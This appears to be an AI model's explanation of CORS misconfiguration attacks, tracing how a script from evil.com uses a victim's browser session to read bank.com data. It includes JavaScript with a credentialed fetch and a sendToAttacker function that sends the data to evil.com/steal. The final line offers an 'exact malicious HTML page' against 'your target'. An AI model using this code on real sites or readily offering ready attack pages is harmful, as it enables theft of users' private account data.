# Cross-Origin-Resource-Sharing

You are asking:

> **If bank.com allows CORS from evil.com, how does the malicious script from evil.com go to the victim’s browser, and how does data reach evil.com afterward?**

Here is the **exact sequence** of what happens — broken down step‑by‑step so you fully understand how CORS exploitation works.

***

# **1. Victim opens evil.com — malicious script loads**

The attacker puts this code on **evil.com**:

```javascript
fetch("https://bank.com/api/transfer", {
    method: "PUT",
    credentials: "include"
})
.then(r => r.text())
.then(d => sendToAttacker(d));
```

This script **runs INSIDE the victim’s browser** when they visit evil.com.

**The script does NOT run on bank.com.  
The script does NOT run on evil.com’s server.  
It runs in the victim’s browser.**

***

# **2. Victim’s browser sends a request to bank.com**

Because the victim is already logged into bank.com, the browser automatically attaches:

*   session cookies
*   JWT tokens
*   authentication headers

The browser makes this request:

    PUT https://bank.com/api/transfer
    Origin: http://evil.com
    Cookie: session=valid

**This request goes from victim’s browser → to bank.com.**

***

# **3. Bank.com sees Origin: <http://evil.com>**

If CORS is misconfigured, bank.com replies with:

    Access-Control-Allow-Origin: http://evil.com
    Access-Control-Allow-Credentials: true

This tells the **victim’s browser**:

> “It is OK for your script from evil.com to read my response.”

**This is the vulnerability.  
NOT that evil.com gets the response directly,  
but that EVIL.COM’s JavaScript in the victim’s browser is allowed to read it.**

***

# **4. The response from bank.com goes ONLY to the victim’s browser**

Bank.com **never** sends data to evil.com.

It replies like any normal HTTP request:

    200 OK
    { "balance": 10000 }

This response goes:
➡️ From bank.com  
➡️ To the victim’s browser

**NOT to evil.com’s server.**

***

# **5. The attacker’s JavaScript running in the victim’s browser reads the response**

Because CORS allows it, the JavaScript that evil.com injected can do this:

```javascript
fetch("https://bank.com/api/profile", {credentials:"include"})
.then(response => response.text())
.then(data => sendToAttacker(data));
```

Now the script **has access to the victim’s bank data** in the browser.

***

# **6. Then the script sends the stolen data to evil.com**

How does the data reach the attacker?

Simple.  
The malicious script inside the victim’s browser does:

```javascript
function sendToAttacker(data) {
    fetch("http://evil.com/steal?data=" + encodeURIComponent(data));
}
```

Now the stolen bank data is sent to the attacker’s server.

***

# 🧠 **FULL FLOW (VERY IMPORTANT)**

### ✔ Step 1: Victim visits evil.com

→ malicious JS loads in victim’s browser

### ✔ Step 2: JS sends request to bank.com

→ using victim’s session cookies

### ✔ Step 3: bank.com allows cross‑origin request (CORS misconfigured)

→ browser is told “you may allow this script to read the response”

### ✔ Step 4: Victim’s browser gives the script the bank’s response

→ bank.com never speaks to evil.com directly

### ✔ Step 5: Script then sends the stolen data to evil.com

→ attacker now has the victim’s private data

***

# ❌ **Key Debunk: bank.com NEVER sends the response to evil.com directly**

This is the most important thing to understand.

Even with perfect CORS misconfiguration:

*   bank.com NEVER contacts evil.com
*   bank.com NEVER sends response to evil.com
*   evil.com NEVER talks directly to bank.com

### The ONLY thing that happens:

✔ The **victim’s browser** does the sending  
✔ The **victim’s browser** does the reading  
✔ The **victim’s browser** forwards it to the attacker

The browser is the “bridge.”

***

# 🟩 **SO YOUR FINAL ANSWER**

**YES**, the two websites must exist for the attack.  
**NO**, bank.com does NOT talk directly to evil.com.  
**YES**, the victim’s browser is the middleman that:

1.  loads the malicious script from evil.com
2.  sends authenticated requests to bank.com
3.  receives bank.com’s CORS-permitted data
4.  forwards it to evil.com

***

If you want, I can show you **the exact malicious HTML page** an attacker would host that carries out a real CORS attack on your target.
